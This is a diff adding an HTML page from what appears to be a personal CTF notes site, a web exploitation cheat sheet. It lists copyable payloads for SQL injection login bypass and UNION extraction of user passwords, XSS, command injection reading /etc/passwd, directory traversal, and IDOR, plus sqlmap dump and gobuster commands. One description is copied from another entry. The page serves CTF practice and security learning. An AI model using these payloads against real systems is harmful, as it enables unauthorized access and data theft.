@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Exploitation - CTF Notes</title>
+    <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+    <!-- Navbar -->
+    <nav class="navbar">
+        <div class="navbar-container">
+            <button class="burger-menu" id="burgerMenu" aria-label="Toggle sidebar">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+            <h1 class="navbar-title">CTF Notes</h1>
+            <div class="navbar-spacer"></div>
+        </div>
+    </nav>
+
+    <!-- Sidebar -->
+    <aside class="sidebar" id="sidebar">
+        <nav class="sidebar-nav">
+            <a href="../index.html" class="nav-item">Home</a>
+            <a href="forensics.html" class="nav-item">Forensics</a>
+            <a href="web.html" class="nav-item active">Web Exploitation</a>
+            <a href="crypto.html" class="nav-item">Cryptography</a>
+            <a href="pwn.html" class="nav-item">PWN</a>
+            <a href="osint.html" class="nav-item">OSINT</a>
+            <a href="re.html" class="nav-item">Reverse Engineering</a>
+        </nav>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="container">
+            <section class="hero">
+                <h1>Web Exploitation</h1>
+                <p>SQL injection, XSS, CSRF, authentication bypass, and other web vulnerabilities</p>
+            </section>
+
+            <section class="search-section">
+                <input 
+                    type="text" 
+                    id="globalSearch" 
+                    class="search-input" 
+                    placeholder="Search commands... (Type to filter)"
+                    aria-label="Search commands"
+                >
+            </section>
+
+            <!-- Command Blocks -->
+
+            <div class="command-block">
+                <h2 class="command-title">SQL Injection - Basic</h2>
+                <div class="command-code-wrapper">
+                    <button class="copy-btn">Copy</button>
+                    <pre class="command-code">' OR '1'='1
+' OR '1'='1' --
+' OR 1=1 --</pre>
+                </div>
+                <p class="command-description">Basic SQL injection payloads to test login forms and query filters. These bypass authentication by manipulating SQL logic. Test with quotes and comment syntax.</p>
+                <div class="tags">
+                    <span class="tag">sqli</span>
+                    <span class="tag">web</span>
+                    <span class="tag">injection</span>
+                </div>
+            </div>
+
+            <div class="command-block">
+                <h2 class="command-title">SQL Injection - Union-Based</h2>
+                <div class="command-code-wrapper">
+                    <button class="copy-btn">Copy</button>
+                    <pre class="command-code">' UNION SELECT NULL,NULL,NULL --
+' UNION SELECT table_name FROM information_schema.tables --
+' UNION SELECT username,password FROM users --</pre>
+                </div>
+                <p class="command-description">Union-based SQLi extracts data by appending UNION SELECT statements. Match column count first, then retrieve database schema and sensitive data.</p>
+                <div class="tags">
+                    <span class="tag">sqli</span>
+                    <span class="tag">web</span>
+                    <span class="tag">extraction</span>
+                </div>
+            </div>
+
+            <div class="command-block">
+                <h2 class="command-title">Cross-Site Scripting (XSS)</h2>
+                <div class="command-code-wrapper">
+                    <button class="copy-btn">Copy</button>
+                    <pre class="command-code">&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+'&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</pre>
+                </div>
+                <p class="command-description">XSS payloads inject malicious JavaScript into web pages. Can steal cookies, credentials, or perform actions on behalf of users. Test in input fields and URL parameters.</p>
+                <div class="tags">
+                    <span class="tag">xss</span>
+                    <span class="tag">web</span>
+                    <span class="tag">injection</span>
+                </div>
+            </div>
+
+            <div class="command-block">
+                <h2 class="command-title">Command Injection</h2>
+                <div class="command-code-wrapper">
+                    <button class="copy-btn">Copy</button>
+                    <pre class="command-code">; cat /etc/passwd
+| whoami
+&amp;&amp; id
+`whoami`
+$(whoami)</pre>
+                </div>
+                <p class="command-description">Inject OS commands through vulnerable input fields. Use command separators like ;, |, &&, backticks, or $() syntax. Often found in ping/traceroute functionality.</p>
+                <div class="tags">
+                    <span class="tag">injection</span>
+                    <span class="tag">web</span>
+                    <span class="tag">rce</span>
+                </div>
+            </div>
+
+            <div class="command-block">
+                <h2 class="command-title">Burp Suite - SQL Injection Testing</h2>
+                <div class="command-code-wrapper">
+                    <button class="copy-btn">Copy</button>
+                    <pre class="command-code">burpsuite
+# Configure proxy on localhost:8080
+# Intercept requests and modify SQL parameters</pre>
+                </div>
+                <p class="command-description">Use Burp Suite to intercept and modify web requests for testing SQL injection and other vulnerabilities. The professional version includes automated scanners.</p>
+                <div class="tags">
+                    <span class="tag">sqli</span>
+                    <span class="tag">web</span>
+                    <span class="tag">tool</span>
+                </div>
+            </div>
+
+            <div class="command-block">
+                <h2 class="command-title">Directory Traversal</h2>
+                <div class="command-code-wrapper">
+                    <button class="copy-btn">Copy</button>
+                    <pre class="command-code">../../../etc/passwd
+....//....//....//etc/passwd
+..%252f..%252fetc%252fpasswd</pre>
+                </div>
+                <p class="command-description">Access files outside the intended directory by traversing the filesystem. Use ../, encoded variations, or null bytes. Common in file download functionality.</p>
+                <div class="tags">
+                    <span class="tag">traversal</span>
+                    <span class="tag">web</span>
+                    <span class="tag">disclosure</span>
+                </div>
+            </div>
+
+            <div class="command-block">
+                <h2 class="command-title">CSRF Token Bypass</h2>
+                <div class="command-code-wrapper">
+                    <button class="copy-btn">Copy</button>
+                    <pre class="command-code"># Remove CSRF token parameter
+# Use expired or duplicate tokens
+# Test with blank token value</pre>
+                </div>
+                <p class="command-description">Cross-Site Request Forgery exploits missing or weak token validation. Try removing tokens, using old values, or crafting forged requests from external sites.</p>
+                <div class="tags">
+                    <span class="tag">csrf</span>
+                    <span class="tag">web</span>
+                    <span class="tag">auth</span>
+                </div>
+            </div>
+
+            <div class="command-block">
+                <h2 class="command-title">Authentication Bypass</h2>
+                <div class="command-code-wrapper">
+                    <button class="copy-btn">Copy</button>
+                    <pre class="command-code">admin' --
+admin' OR 1=1 --
+admin' /*
+admin') --</pre>
+                </div>
+                <p class="command-description">Bypass login pages using SQL injection, default credentials, or comment injection. Test common usernames like admin, test, guest with simple payloads.</p>
+                <div class="tags">
+                    <span class="tag">auth</span>
+                    <span class="tag">web</span>
+                    <span class="tag">bypass</span>
+                </div>
+            </div>
+
+            <div class="command-block">
+                <h2 class="command-title">Insecure Direct Object Reference (IDOR)</h2>
+                <div class="command-code-wrapper">
+                    <button class="copy-btn">Copy</button>
+                    <pre class="command-code">/user/profile?id=1
+/user/profile?id=2
+/user/profile?id=admin</pre>
+                </div>
+                <p class="command-description">Access other users' data by manipulating object references like user IDs. Test sequential, predictable, and known IDs to bypass authorization checks.</p>
+                <div class="tags">
+                    <span class="tag">idor</span>
+                    <span class="tag">web</span>
+                    <span class="tag">auth</span>
+                </div>
+            </div>
+
+            <div class="command-block">
+                <h2 class="command-title">Web Scraping with curl</h2>
+                <div class="command-code-wrapper">
+                    <button class="copy-btn">Copy</button>
+                    <pre class="command-code">curl -L http://example.com
+curl -H "User-Agent: Mozilla/5.0" http://example.com
+curl -b cookies.txt http://example.com</pre>
+                </div>
+                <p class="command-description">Extract web content for analysis. -L follows redirects, -H sets headers, -b sends cookies. Useful for gathering information from dynamic content and authenticated pages.</p>
+                <div class="tags">
+                    <span class="tag">web</span>
+                    <span class="tag">scraping</span>
+                    <span class="tag">recon</span>
+                </div>
+            </div>
+
+            <div class="command-block">
+                <h2 class="command-title">SqlMap</h2>
+                <div class="command-code-wrapper">
+                    <button class="copy-btn">Copy</button>
+                    <pre class="command-code">sqlmap -u "https://example.com/index.php?id=1'" --dbs
+sqlmap -u "https://example.com/index.php?id=1'" --cookie="PHPSESSID=value" --tables
+sqlmap -u "https://example.com/index.php?id=1'" --cookie="PHPSESSID=value" -T namatabel --dump
+sqlmap -u "https://example.com/index.php?id=1'" --threads=3
+sqlmap -u "https://example.com/index.php?id=1'" --timeout=30
+</pre>
+                </div>
+                <p class="command-description">Ngapain nyoba payload satu-satu, pake sqlmap lahh</p>
+                <div class="tags">
+                    <span class="tag">web</span>
+                </div>
+            </div>
+
+            <div class="command-block">
+                <h2 class="command-title">Dirbuster</h2>
+                <div class="command-code-wrapper">
+                    <button class="copy-btn">Copy</button>
+                    <pre class="command-code"> gobuster dir -u https://example.com -w /usr/share/wordlists
+</pre>
+                </div>
+                <p class="command-description">Ngapain nyoba payload satu-satu, pake sqlmap lahh</p>
+                <div class="tags">
+                    <span class="tag">web</span>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Overlay for mobile -->
+    <div class="overlay" id="overlay"></div>
+
+    <script src="../assets/js/script.js"></script>
+</body>
+</html>
